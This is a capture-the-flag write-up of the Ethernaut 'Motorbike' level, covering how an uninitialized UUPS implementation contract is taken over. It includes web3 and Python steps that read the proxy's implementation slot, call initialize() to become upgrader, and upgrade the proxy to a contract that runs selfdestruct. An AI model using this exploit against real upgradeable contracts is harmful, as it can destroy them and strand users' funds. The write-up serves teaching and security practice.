# 25 - Motorbike

## Challenge

Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to `selfdestruct` its engine and make the motorbike unusable?

Things that might help:

- [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)
- [UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) upgradeable pattern
- [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract

```js
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

## Summary

We first check what is this UUPS (Universal Upgradeable Proxy Standard) pattern. Recall in last level we have Transparent proxy pattern, where proxy contract has the upgrade logic. **In a UUPS proxy pattern, the contract upgrade logic will also be coded in the implementation contract.**

![UUPS](https://cdn.hashnode.com/res/hashnode/image/upload/v1662815219918/duvwx0juR.png?auto=compress,format&format=webp)

Reading the EIP-1967 doc, we get to know that the address of the logic contract is saved in a specific storage slot of the proxy contract. The slot is calculated by `keccak256("eip1967.proxy.implementation") - 1`. The logic contract is initialized in the constructor of the proxy contract. The fallback function of the proxy contract will delegate the call to the logic contract.

In this level, our goal is to call `selfdestruct`, but current `Engine` contract has no such function. Therefore, the goal is clearly to somehow upgrade the contract to a new version that has `selfdestruct` function. 

```js
// Upgrade the implementation of the proxy to `newImplementation`
// subsequently execute the function call
function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
    _authorizeUpgrade();
    _upgradeToAndCall(newImplementation, data);
}
```

We need to call `upgradeToAndCall` function to upgrade the contract.  This requires `_authorizeUpgrade`, so we need to be the `upgrader` to call this function. The only place we can modify this variable is here:

```js
function initialize() external initializer {
    horsePower = 1000;
    upgrader = msg.sender;
}
```

This function is supposed to be called by `Motorcycle` contract upon initialization, and this `initializer` modifier is supposed to prevent re-initialization. However, we can bypass this by calling `initialize` function directly. Why so? Because it's called using `delegatecall`, and we know its context preservation property: the caller contract's storage slots are updated instead of callee's. Therefore, we can call `initialize` function directly to update `upgrader` variable. The rest is easy as mentioned before.

## Walkthrough

First, we need to get the address of `Engine` contract:

```js
> engine = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
'0x00000000000000000000000011eba4ee24111e0486b88e102bb5d9b27e78273a'
> engine = "0x11eba4ee24111e0486b88e102bb5d9b27e78273a"
```

Now we call `initialize` at `Engine`'s address, and we can verify we are `upgrader`:

```js
> await web3.eth.sendTransaction({ from: player, to: engine, data: web3.eth.abi.encodeFunctionSignature("initialize()") })
{blockHash: '0x6170738ef3b4548b8f414af52d745c8767e5730220b1e4152eb4a8545c1ecf8e', blockNumber: 9429705, contractAddress: null, cumulativeGasUsed: 1445980, effectiveGasPrice: 2500000849, …}
> await web3.eth.call({from: player, to: engine, data: web3.eth.abi.encodeFunctionSignature("upgrader()")}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()
true
```

Now we go ahead to create an attack contract that calls `selfdestruct`:

```py
# import cheb related
from cheb3 import Connection
from cheb3.utils import *

abi, bytecode = compile_sol('''
pragma solidity <0.7.0;

contract Attack {
    function attack() public {
        selfdestruct(address(0));
    }
}
''',
solc_version="0.6.12",
base_path="Ethernaut/node_modules/"
)['Attack']
attackContract = conn.contract(account, abi=abi, bytecode=bytecode)
attackContract.deploy()
```

```bash
2023-07-29 13:41:44.990 | DEBUG    | cheb3.contract:deploy:94 - Deploying contract ...
2023-07-29 13:41:50.606 | INFO     | cheb3.contract:deploy:99 - The contract is deployed at 0x5bB7E9b41D2B0410a675F36af79B2510D3bfB734
```

Next, replace the contract address of implementation slot in proxy with this attack contract. This requires us to call `function upgradeToAndCall(address newImplementation, bytes memory data)`:

```py
>>> attackAddr = "0x5bB7E9b41D2B0410a675F36af79B2510D3bfB734"
>>> attackData = encode_with_signature("attack()")
'0x9e5faafc'
>>> upgradeData = encode_with_signature("upgradeToAndCall(address,bytes)", attackAddr, bytes.fromhex(attackData[2:]))
'0x4f1ef2860000000000000000000000005bb7e9b41d2b0410a675f36af79b2510d3bfb734000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000049e5faafc00000000000000000000000000000000000000000000000000000000'
>>> account.send_transaction(engine, data=upgradeData)
```

Finally, submit the instance to pass the level. At this moment, the `Engine` is destroyed, and `Motorbike` is now useless. Since upgrade logic is all inside logic contract, `Motorbike` cannot be fixed.

## Afterword

The advantage of following an UUPS pattern is to have very minimal proxy to be deployed. The proxy acts as storage layer so any state modification in the implementation contract normally doesn't produce side effects to systems using it, since only the logic is used through delegatecalls.

This doesn't mean that you shouldn't watch out for vulnerabilities that can be exploited if we leave an implementation contract uninitialized.

This was a slightly simplified version of what has really been discovered after months of the release of UUPS pattern.

Takeways: never leave implementation contracts uninitialized ;)